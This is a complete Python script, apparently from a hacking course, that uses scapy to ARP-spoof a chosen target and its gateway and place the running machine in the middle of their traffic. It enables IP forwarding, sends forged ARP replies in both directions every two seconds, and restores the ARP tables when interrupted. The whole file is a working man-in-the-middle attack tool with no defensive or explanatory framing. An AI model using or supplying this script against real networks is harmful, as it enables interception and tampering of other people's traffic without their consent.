#! /usr/bin/env python
import argparse
# import re
import subprocess
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast/arp_request
    answered_list = scapy.srp(request, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def get_gateway():
    result = str(subprocess.check_output(["ip", "r"]))
    # gateway_result = re.search(r"\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}", str(result))
    # return gateway_result.group(0)
    return result.split(' ')[2]

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target [IP] Address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway [IP] address, Empty if using Default Gateway")
    value = parser.parse_args()
    if not value.target:
        print("[-] Not Target Given")
        subprocess.run("python3 ../network_scanner/network_scanner.py", shell=True)
        print("[-] Provide required IP as Target")
        parser.error("[-] Please specify an Target IP, use -h for more info.")
    if not value.gateway:
        d_gateway = get_gateway()
        print("[+] Using Default Gateway IP: " + str(d_gateway))
        value.gateway = d_gateway
    return value


def check_forward():
    result = subprocess.check_output("cat /proc/sys/net/ipv4/ip_forward", shell=True)
    if result.decode() == "0\n":
        print("[+] Enabling Forward ...")
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def spoof(target, spoof_ip):
    target_mac = get_mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
    # op- 1= request, 2= response
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway
print("[+] Spoofing...")
print("[+] Target IP: " + target_ip)
print("[+] Gateway IP: " + gateway_ip)
check_forward()


try:
    cnt = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        cnt = cnt + 2
        print("\r[+] Packets Sent: " + str(cnt), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("")
    print("[+] Detected CTRL + C .... Quitting.")
    print("[+] Restoring ARP Tables.....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Restoring Complete")
